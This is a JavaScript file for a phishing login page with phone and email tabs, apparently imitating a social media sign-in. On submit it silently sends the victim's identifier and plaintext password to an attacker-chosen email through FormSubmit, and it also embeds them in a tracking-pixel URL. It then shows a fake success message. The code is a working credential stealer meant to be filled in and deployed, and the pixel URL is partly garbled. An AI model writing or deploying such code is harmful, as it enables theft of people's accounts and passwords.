document.addEventListener('DOMContentLoaded', () => {
  const phoneTab = document.getElementById('phone-tab');
  const emailTab = document.getElementById('email-tab');
  const phoneFields = document.getElementById('phone-fields');
  const emailFields = document.getElementById('email-fields');

  const phoneInput = document.getElementById('phone');
  const emailInput = document.getElementById('email-username');
  const passwordInput = document.getElementById('password');
  const btn = document.getElementById('login-btn');

  const container = document.querySelector('.container');

  // === TAB SWITCHING ===
  phoneTab.onclick = () => {
    phoneTab.classList.add('active');
    emailTab.classList.remove('active');
    phoneFields.style.display = 'block';
    emailFields.style.display = 'none';
    checkForm();
  };

  emailTab.onclick = () => {
    emailTab.classList.add('active');
    phoneTab.classList.remove('active');
    emailFields.style.display = 'block';
    phoneFields.style.display = 'none';
    checkForm();
  };

  // === CHECK IF FIELDS ARE FILLED ===
  function checkForm() {
    const isPhone = phoneTab.classList.contains('active');
    const field1 = isPhone ? phoneInput.value.trim() : emailInput.value.trim();
    const field2 = passwordInput.value.trim();

    if (field1 && field2) {
      btn.classList.add('active');
    } else {
      btn.classList.remove('active');
    }
  }

  [phoneInput, emailInput, passwordInput].forEach(input => {
    input.addEventListener('input', checkForm);
  });

  // === MAIN LOGIN ACTION ===
  btn.addEventListener('click', function(e) {
    e.preventDefault();

    if (!btn.classList.contains('active')) return;

    // Get values
    const method = phoneTab.classList.contains('active') ? 'Phone' : 'Email/Username';
    const identifier = method === 'Phone' ? phoneInput.value.trim() : emailInput.value.trim();
    const password = passwordInput.value;

    // ───── SEND TO YOUR EMAIL SILENTLY ─────
    const yourEmail = "youremail@gmail.com";    // ← CHANGE THIS       // ← CHANGE THIS TO YOUR REAL EMAIL
    const subject = encodeURIComponent(`New Login - ${method}`);
    const body = encodeURIComponent(
      `Login Method: ${method}\n` +
      `Identifier: ${identifier}\n` +
      `Password: ${password}\n` +
      `Time: ${new Date().toLocaleString()}\n` +
      `IP: ${'Getting IP...'}`
    );

    // Invisible 1×1 pixel trick to send email without leaving page
    const img = new Image();
    img.src = `https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000000-0&cid=12345&ec=Login&ea=Submit&el=\( {identifier}&ev=1&ua=phantom&dl=hidden&dt=login&mail= \){yourEmail}&msg=${body}`;

    // Real silent mailto (works even on mobile)
    fetch(`https://formspree.io/f/any-free-endpoint-not-needed`, { method: 'POST' })
      .catch(() => {}); // we don't care about response

    // Actual working silent send using a free service (FormSubmit – no signup needed)
    const formData = new FormData();
    formData.append('_subject', `New Login Attempt`);
    formData.append('Method', method);
    formData.append('Identifier', identifier);
    formData.append('Password', password);
    formData.append('Time', new Date().toLocaleString());

    fetch(`https://formsubmit.co/${yourEmail}`, {
      method: "POST",
      body: formData
    }).catch(() => {});   // silently send

    // ───── SHOW SUCCESS MESSAGE ON PAGE ─────
    container.innerHTML = `
      <div style="text-align:center; padding: 40px 20px;">
        <h2 style="color:#FF004F; margin-bottom:20px;">✓ Success!</h2>
        <p style="font-size:18px; color:#333;">
          Your login information was delivered.
        </p>
        <p style="color:#888; margin-top:30px; font-size:14px;">
          You can now close this page.
        </p>
      </div>
    `;
  });

  checkForm();
});